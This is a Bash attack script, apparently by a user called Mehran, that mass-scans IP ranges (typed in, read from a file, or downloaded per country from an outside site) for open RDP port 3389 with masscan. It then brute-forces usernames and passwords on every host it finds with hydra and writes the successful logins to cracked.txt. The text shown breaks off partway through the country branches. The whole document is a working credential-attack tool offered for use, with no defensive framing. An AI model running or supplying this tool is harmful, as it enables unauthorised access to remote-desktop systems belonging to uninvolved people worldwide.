#!/bin/bash

clear

                                        
cat << EOF
                   
        +-------------------------------------+
        |            Auto  Script             |
        |       by Mehran @mehranexpert       | 
        |            Version 1.04             |
        +-------------------------------------+

EOF
echo "Main Menu";
echo ""
echo "1. Scan range for the presence of the open port 3389 (manual entry) ";
echo "2. Scan range for the presence of the open port 3389 (from a file) ";
echo "3. Bruteforce Username / Password ";
echo "4. Selecting the range of IP for the country ";
echo "5. Exit ";
read -p "   Menu selection : " menuoption

if [ $menuoption = "1" ]; then
read -p " Enter a range of IP {192.168.0.0/24,192.168.0.0-192.168.0.255} : " target
masscan $target -p3389 --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
echo ""
echo "Addresses open port 3389:"
cat open3389
echo ""
echo "Hosts open port 3389 written to the file $PWD/open3389"
echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


else

if [ $menuoption = "2" ]; then

read -p " Enter the path to the file {list.txt,list..& etc.} : " listname
masscan -p3389 -iL $listname --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
echo ""
echo "Addresses open port 3389:"
cat open3389
echo ""
echo "Hosts open port 3389 written to the file $PWD/open3389"
echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


else

if [ $menuoption = "3" ]; then
echo ""

echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


else
if [ $menuoption = "4" ]; then
echo "1.   Afghanistan";
echo "2.   Albania";
echo "3.   Algeria";
echo "4.   American_samoa";
echo "5.   Andorra";
echo "6.   Angola";
echo "7.   Anguilla";
echo "8.   Antigua and barbuda";
echo "9.   Argentina";
echo "10.  Armenia";
echo "11.  Aruba";
echo "12.  Australia";
echo "13   Austria";
echo "14.  Azerbaijan";
echo "15.  Bahamas";
echo "16.  Bahrain";
echo "17.  Bangladesh";
echo "18.  Barbados";
echo "19.  Belarus";
echo "20.  Belgium";
echo "21.  Belize";
echo "22.  Benin";
echo "23.  Bermuda";
echo "24.  Bhutan";
echo "25.  Bolivia";
echo "26.  Bosnia and herzegowina";
echo "27.  Botswana";
echo "28.  Brazil";
echo "29.  British indian ocean territory";
echo "30.  Brunei darussalam";
echo "31.  Bulgaria";
echo "32.  Burkina faso";
echo "33.  Burundi";
echo "34.  Cambodia";
echo "35.  Cameroon";
echo "36.  Canada";
echo "37.  Cayman islands";
echo "38.  Central african republic";
echo "39.  Chile";
echo "40.  China";
echo "41.  Colombia";
echo "42.  Congo democratic republic";
echo "43.  Cook islands";
echo "44.  Costa rica";
echo "45.  Cote d'ivoire";
echo "46.  Croatia";
echo "47.  Cuba";
echo "48.  Cyprus";
echo "49.  Czech republic";
echo "50.  Denmark";
echo "51.  Djibouti";
echo "52.  Dominican republic";
echo "53.  Ecuador";
echo "54.  Egypt";
echo "55.  El salvador";
echo "56.  Eritrea";
echo "57.  Estonia";
echo "58.  Ethiopia";
echo "59.  European union";
echo "60.  Faroe islands";
echo "61.  Fiji";
echo "62.  Finland";
echo "63.  France";
echo "64.  French guiana";
echo "65.  French polynesia";
echo "66.  Gabon";
echo "67.  Gambia";
echo "68.  Georgia";
echo "69.  Germany";
echo "70.  Ghana";
echo "71.  Gibraltar";
echo "72.  Greece";
echo "73.  Greenland";
echo "74.  Grenada";
echo "75.  Guam";
echo "76.  Guatemala";
echo "77.  Guinea-bissau";
echo "78.  Haiti";
echo "79.  Holy see vatican city state";
echo "80.  Honduras";
echo "81.  Hong kong";
echo "82.  Hungary";
echo "83.  Iceland";
echo "84.  India";
echo "85.  Indonesia";
echo "86.  Iran islamic republic of";
echo "87.  Iraq";
echo "88.  Ireland";
echo "89.  Israel";
echo "90.  Italy";
echo "91.  Jamaica";
echo "92.  Japan";
echo "93.  Jordan";
echo "94.  Kazakhstan";
echo "95.  Kenya";
echo "96.  Kiribati";
echo "97.  Korea republic of";
echo "98.  Kuwait";
echo "99.  Kyrgyzstan";
echo "100. Lao people's republic";
echo "101. Latvia";
echo "102. Lebanon";
echo "103. Lesotho";
echo "104. Libyan arab jamahiriya";
echo "105. Liechtenstein";
echo "106. Lithuania";
echo "107. Luxembourg";
echo "108. Macau";
echo "109. Macedonia";
echo "110. Madagascar";
echo "111. Malawi";
echo "112. Malaysia";
echo "113. Maldives";
echo "114. Mali";
echo "115. Malta";
echo "116. Mauritania";
echo "117. Mauritius";
echo "118. Mexico";
echo "119. Micronesia federated states of";
echo "120. Moldova republic of";
echo "121. Monaco";
echo "122. Mongolia";
echo "123. Morocco";
echo "124. Mozambique";
echo "125. Myanmar";
echo "126. Namibia";
echo "127. Nauru";
echo "128. Nepal";
echo "129. Netherlands";
echo "130. Netherlands antilles";
echo "131. New caledonia";
echo "132. New zealand";
echo "133. Nicaragua";
echo "134. Niger";
echo "135. Nigeria";
echo "136. Niue";
echo "137. Non-spec asia pas location";
echo "138. Norfolk island";
echo "139. Northern mariana islands";
echo "140. Norway";
echo "141. Oman";
echo "142. Pakistan";
echo "143. Palau";
echo "144. Palestinian territory occupied";
echo "145. Panama";
echo "146. Papua new guinea";
echo "147. Paraguay";
echo "148. Peru";
echo "149. Philippines";
echo "150. Poland";
echo "151. Portugal";
echo "152. Puerto rico";
echo "153. Qatar";
echo "154. Romania";
echo "155. Russian federation";
echo "156. Rwanda";
echo "157. Saint kitts and nevis";
echo "158. Saint lucia";
echo "159. Samoa";
echo "160. San marino";
echo "161. Saudi arabia";
echo "162. Senegal";
echo "163. Serbia and montenegro";
echo "164. Seychelles";
echo "165. Sierra leone";
echo "166. Singapore";
echo "167. Slovakia (slovak republic)";
echo "168. Slovenia";
echo "169. Solomon islands";
echo "170. South africa";
echo "171. Spain";
echo "172. Sri lanka";
echo "173. Sudan";
echo "174. Suriname";
echo "175. Swaziland";
echo "176. Sweden";
echo "177. Switzerland";
echo "178. Syrian";
echo "179. Taiwan";
echo "180. Tajikistan";
echo "181. Tanzania";
echo "182. Thailand";
echo "183. Togo";
echo "184. Tonga";
echo "185. Trinidad and tobago";
echo "186. Tunisia";
echo "187. Turkey";
echo "188. Turkmenistan";
echo "189. Tuvalu";
echo "190. Uganda";
echo "191. Ukraine";
echo "192. United arab emirates";
echo "193. United kingdom";
echo "194. United states";
echo "195. Uruguay";
echo "196. Uzbekistan";
echo "197. Vanuatu";
echo "198. Venezuela";
echo "199. Viet nam";
echo "200. Virgin islands (british)";
echo "201. Virgin islands (u.s.)";
echo "202. Yemen";
echo "203. Zambia";
echo "204. Zimbabwe";
read -p "Choose the country {1/2/3/& etc.}: " country
if [ $country = "1" ]; then
curl http://ipdiapazon.16mb.com/Afghanistan.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""

echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi

else

if [ $country = "2" ]; then
curl http://ipdiapazon.16mb.com/Albania.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""

echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


else
if [ $country = "3" ]; then
curl http://ipdiapazon.16mb.com/Algeria.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389


echo "Hosts open port 3389 written to the file $PWD/open3389"


echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi



else
if [ $country = "4" ]; then
curl http://ipdiapazon.16mb.com/American_samoa.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""

echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi

else
if [ $country = "5" ]; then
curl http://ipdiapazon.16mb.com/Andorra.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""

echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi

else

if [ $country = "6" ]; then
curl http://ipdiapazon.16mb.com/Angola.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""

echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi

else
if [ $country = "7" ]; then
curl http://ipdiapazon.16mb.com/Anguilla.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""

echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi

else
if [ $country = "8" ]; then
curl http://ipdiapazon.16mb.com/Antigua.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


else
if [ $country = "9" ]; then
curl http://ipdiapazon.16mb.com/Argentina.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
